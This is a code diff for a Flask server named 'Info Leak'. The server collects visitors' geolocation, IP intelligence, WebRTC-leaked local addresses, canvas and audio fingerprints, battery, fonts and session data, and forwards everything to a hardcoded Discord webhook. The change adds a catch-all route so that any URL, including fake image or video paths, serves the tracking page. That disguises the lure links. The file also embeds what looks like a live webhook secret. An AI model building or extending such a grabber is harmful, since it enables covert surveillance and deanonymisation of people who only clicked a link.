@@ -1,6 +1,7 @@
 from flask import Flask, request, jsonify, send_file
 import json
 import datetime
+import os
 import requests
 
 app = Flask(__name__)
@@ -8,18 +9,47 @@ app = Flask(__name__)
 # Your Discord webhook URL
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1559400657822285867/l5kZxX5HLiSl_4d7dIUdcStl2lMOmDXhB1c-QkBLVDcuq--uhL-QoSySabvpWWjDLAMF"
 
-@app.route('/')
-def serve_index():
-    return send_file('../static/index.html')
+
+def _find_index():
+    """Locate index.html no matter where the app is started from."""
+    candidates = [
+        os.path.join(app.static_folder, 'index.html'),          # ./static/index.html
+        os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'static', 'index.html')),
+        os.path.join(os.path.dirname(__file__), 'index.html'),  # ./index.html (root)
+        os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'index.html')),
+    ]
+    for c in candidates:
+        if c and os.path.isfile(c):
+            return c
+    return None
+
+
+def serve_index(anything=None):
+    path = _find_index()
+    if path:
+        return send_file(path)
+    return (
+        "<h1>Info Leak server running</h1>"
+        "<p>No index.html was found next to /static. Place your page at <code>static/index.html</code>.</p>",
+        200,
+    )
+
+
+# --- THE FIX: catch ANY path / extension and still serve the page ---
+# '/path/to/anything.gif', '/foo/bar/baz.mp4', '/x' ... all hit serve_index().
+app.add_url_rule('/<path:anything>', 'catch_all', view_func=serve_index, methods=['GET'])
+# The bare root also works.
+app.add_url_rule('/', 'index', view_func=serve_index, methods=['GET'])
+
 
 @app.route('/track', methods=['POST'])
 def track_data():
     data = request.json
     print("Data received:", json.dumps(data, indent=2))
-    
+
     # Get IP from request
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    
+
     # Try to get IP intelligence
     ip_info = {}
     try:
@@ -40,18 +70,19 @@ def track_data():
                 }
     except Exception as e:
         print(f"IP lookup failed: {e}")
-    
+
     data['ipInfo'] = ip_info
     data['clientIp'] = client_ip
-    
+
     # Send to Discord with boxed formatting
     send_to_discord(data)
-    
+
     return jsonify({"status": "success", "discord_sent": True})
+
 
 def send_to_discord(data):
     """Send boxed format to Discord"""
-    
+
     location = data.get('location', {})
     ip_info = data.get('ipInfo', {})
     screen = data.get('screen', {})
@@ -61,7 +92,7 @@ def send_to_discord(data):
     hw = data.get('hardware', {})
     fonts = data.get('fonts', [])
     plugins = data.get('plugins', [])
-    
+
     # Build boxed message
     lines = []
     lines.append("```")
@@ -69,7 +100,7 @@ def send_to_discord(data):
     lines.append("║                    📡 INFO LEAK                           ║")
     lines.append("╠════════════════════════════════════════════════════════════╣")
     lines.append("")
-    
+
     # LOCATION
     if location and location.get('latitude'):
         lat = location.get('latitude')
@@ -82,7 +113,7 @@ def send_to_discord(data):
     else:
         lines.append(f"║ 📍 LOCATION: ❌ {location.get('error', 'Not shared')}")
     lines.append("║")
-    
+
     # IP INTELLIGENCE
     if ip_info:
         lines.append("║ 🌐 IP INTELLIGENCE")
@@ -94,7 +125,7 @@ def send_to_discord(data):
         if ip_info.get('as'): lines.append(f"║    ASN: {ip_info['as']}")
         if ip_info.get('zip'): lines.append(f"║    ZIP: {ip_info['zip']}")
     lines.append("║")
-    
+
     # DEVICE & BROWSER
     lines.append("║ 🖥️ DEVICE & BROWSER")
     lines.append(f"║    OS: {data.get('platform', 'N/A')}")
@@ -107,21 +138,21 @@ def send_to_discord(data):
     if hw.get('maxTouchPoints'):
         lines.append(f"║    Touch Points: {hw['maxTouchPoints']}")
     lines.append("║")
-    
+
     # SCREEN
     lines.append("║ 📺 SCREEN")
     lines.append(f"║    Resolution: {screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}")
     lines.append(f"║    Pixel Ratio: {screen.get('pixelRatio', 'N/A')}x")
     lines.append(f"║    Color Depth: {screen.get('colorDepth', 'N/A')}bit")
     lines.append("║")
-    
+
     # WEBRTC LEAK
     if webrtc and webrtc[0] not in ['No local IPs found', 'WebRTC not supported']:
         lines.append("║ 🔓 WEBRTC LEAK")
         for ip in webrtc:
             lines.append(f"║    {ip}")
     lines.append("║")
-    
+
     # FINGERPRINTS
     lines.append("║ 🆔 FINGERPRINTS")
     canvas = data.get('canvasFingerprint', 'N/A')
@@ -129,7 +160,7 @@ def send_to_discord(data):
     lines.append(f"║    Canvas: {canvas[:12]}")
     lines.append(f"║    Audio: {audio[:12]}")
     lines.append("║")
-    
+
     # BATTERY
     if battery:
         lines.append("║ 🔋 BATTERY")
@@ -138,7 +169,7 @@ def send_to_discord(data):
             status = "Charging" if battery['charging'] else "Discharging"
             lines.append(f"║    Status: {status}")
     lines.append("║")
-    
+
     # PERFORMANCE
     if perf and perf.get('loadTime') and perf['loadTime'] != 'N/A':
         lines.append("║ ⚡ PERFORMANCE")
@@ -147,7 +178,7 @@ def send_to_discord(data):
         if perf.get('ttfb'): lines.append(f"║    TTFB: {perf['ttfb']}ms")
         if perf.get('tcp'): lines.append(f"║    TCP: {perf['tcp']}ms")
     lines.append("║")
-    
+
     # TIMEZONE
     lines.append("║ 🕐 TIMEZONE")
     lines.append(f"║    {data.get('timezone', 'N/A')}")
@@ -158,7 +189,7 @@ def send_to_discord(data):
         sign = '-' if offset > 0 else '+'
         lines.append(f"║    UTC{sign}{hours:02d}:{mins:02d}")
     lines.append("║")
-    
+
     # FONTS
     if fonts:
         font_list = ', '.join(fonts[:8])
@@ -167,7 +198,7 @@ def send_to_discord(data):
         lines.append("║ 📝 FONTS")
         lines.append(f"║    {font_list}")
     lines.append("║")
-    
+
     # PLUGINS
     if plugins:
         plugin_list = ', '.join(plugins[:5])
@@ -176,7 +207,7 @@ def send_to_discord(data):
         lines.append("║ 🧩 PLUGINS")
         lines.append(f"║    {plugin_list}")
     lines.append("║")
-    
+
     # SESSION
     lines.append("║ 🆔 SESSION")
     lines.append(f"║    ID: {data.get('sessionId', 'N/A')}")
@@ -186,21 +217,23 @@ def send_to_discord(data):
     if data.get('referrer') and data['referrer'] != 'Direct':
         lines.append(f"║    Referrer: {data['referrer'][:50]}...")
     lines.append("║")
-    
+
     # BOTTOM BORDER
     lines.append("╚════════════════════════════════════════════════════════════╝")
     lines.append("```")
-    
+
     # Send to Discord
     payload = {
         "content": "\n".join(lines),
         "username": "Info Leak"
     }
-    
+
     try:
         response = requests.post(DISCORD_WEBHOOK, json=payload, timeout=10)
         print(f"Discord status: {response.status_code}")
     except Exception as e:
         print(f"Error: {e}")
 
-app = app
+
+if __name__ == '__main__':
+    app.run(debug=True)
